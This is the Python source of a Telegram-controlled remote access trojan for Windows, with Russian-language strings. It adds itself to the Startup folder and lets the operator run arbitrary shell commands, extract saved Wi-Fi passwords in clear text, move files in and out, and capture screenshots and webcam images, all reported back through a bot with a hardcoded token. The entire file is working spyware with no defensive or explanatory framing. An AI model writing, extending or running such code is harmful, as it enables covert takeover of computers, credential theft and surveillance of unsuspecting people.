import getpass
import io
import os
import subprocess
import pyautogui
import cv2
import pyscreenshot
from logging import basicConfig, getLogger, INFO

from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.types import ContentType
from aiogram.utils import executor

USER_NAME = getpass.getuser()

basicConfig(level=INFO)
log = getLogger()


def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)


class RemoteManager:
    def __init__(self, bot):
        self.bot = bot

    def execute(self, command):
        result = ""
        try:
            print(command)
            if command[0] == 'cd' and len(command) > 1:
                result = self.change_directory(command[1])
            elif command[0] == 'wifi':
                result = self.get_passwords()
                print(result)
            else:
                result = self.execute_command_console(command)

        except Exception:
            result = "[-] Error"

        return result

    def execute_command_console(self, command):
        child = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
        my_out = io.TextIOWrapper(child.stdout, encoding='cp866')
        shell_output_string = ' '
        res = ''
        while shell_output_string:
            shell_output_string = my_out.readline()
            new_string = ' '.join(shell_output_string.split()) + '\n'
            res += new_string

        return res

    def get_passwords(self):
        wifi_list = self.execute_command_console("netsh wlan show profiles")

        data = wifi_list.split('\n')

        names = []
        for i in data:
            if "Все профили пользователей" in i:
                i = i.split(":")
                i = i[1]
                i = i[1::]
                names.append(i)

        passwords = []
        for name in names:
            password_list = self.execute_command_console(f'netsh wlan show profile name="{name}" key=clear')
            data = password_list.split('\n')
            for i in data:
                if "Содержимое ключа" in i:
                    i = i.split(":")
                    i = i[1]
                    i = i[1::]
                    passwords.append(i)

        res = ''
        for i in range(len(passwords)):
            res += f"{names[i]} : {passwords[i]}\n"

        return res

    def change_directory(self, path):
        try:
            os.chdir(path)
            return f"[+] Changing directory to {self.execute_command_console('cd')}"
        except FileNotFoundError:
            return "Cannot find this path/file/dir"
        except OSError:
            return "Syntax error in name of path/file/dir"


TOKEN = "5190279756:AAH2rA0hZdtIziHSKm3A3YtXIIPihN4GXQ0"
bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

rm = RemoteManager(bot)


@dp.message_handler(commands=['start'])
async def process_start_command(message: types.Message):
    await message.reply("Привет!\n"
                        "Вот список моих комманд:\n"
                        "/download 'file_name' - скачать файл из текущей директории")


async def send_message(bot, id, text):
    while text:
        await bot.send_message(id, text[:4096])
        text = text[4096::]


@dp.message_handler(commands=['download'])
async def download(message: types.Message):
    try:
        command = message.text.split()
        content = open(command[1], 'rb')

        await message.reply_document(content)
    except Exception:
        await message.reply("Error in download file")


@dp.message_handler(commands=['.'])
async def exe(message: types.Message):
    command = message.text.split()[1::]
    await message.reply(rm.execute_command_console(command))


@dp.message_handler(commands=['screen'])
async def send_screenshot(msg: types.Message):
    pyautogui.hotkey('win', 'd')
    image = pyscreenshot.grab()
    image.save("screen.png")

    await bot.send_photo(msg.from_user.id, types.InputFile('screen.png'))


@dp.message_handler(commands=['cam'])
async def send_cam(msg: types.Message):
    cap = cv2.VideoCapture(0)

    # Check if the webcam is opened correctly
    if not cap.isOpened():
        res = "Error! No access to cam"

    ret, frame = cap.read()
    # уменьшить в 2 раза
    frame = cv2.resize(frame, None, fx=0.5, fy=0.5, interpolation=cv2.INTER_AREA)
    cv2.imwrite("screen_camera.png", frame)

    cap.release()
    cv2.destroyAllWindows()

    await bot.send_photo(msg.from_user.id, types.InputFile('screen_camera.png'))


@dp.message_handler(commands=['o'])
async def echo_message(msg: types.Message):
    pyautogui.hotkey('f1')


@dp.message_handler()
async def echo_message(msg: types.Message):
    command = str(msg.text).split()
    result = rm.execute(command)
    print(1)
    await send_message(bot, msg.from_user.id, result)


@dp.message_handler(content_types=[ContentType.DOCUMENT, ContentType.UNKNOWN])
async def upload(message: types.Message):
    try:
        file = message.document

        path = rm.execute_command_console('cd')
        path = path[:len(path) - 1:]

        path += '\\' + file.file_name
        print(path)
        await file.download(destination_file=path)
        await message.reply("Success")
    except Exception:
        await message.reply("Error in upload file")


if __name__ == '__main__':
    add_to_startup()
    executor.start_polling(dp)
